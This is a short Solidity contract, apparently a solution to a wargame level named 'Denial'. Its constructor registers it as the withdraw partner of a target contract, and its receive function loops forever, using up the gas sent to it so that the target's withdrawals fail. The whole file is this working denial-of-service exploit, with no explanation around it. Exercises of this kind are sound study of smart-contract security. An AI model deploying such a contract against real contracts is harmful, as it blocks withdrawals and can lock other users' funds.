// SPDX-License-Identifier: MIT

pragma solidity >=0.8.2 <0.9.0;

interface IDenial {
    function setWithdrawPartner(address _partner) external;
}

contract DenialBraker {
    constructor(address to) {
        IDenial(to).setWithdrawPartner(address(this));
    }

    receive() external payable {
        while (true) {}
    }
}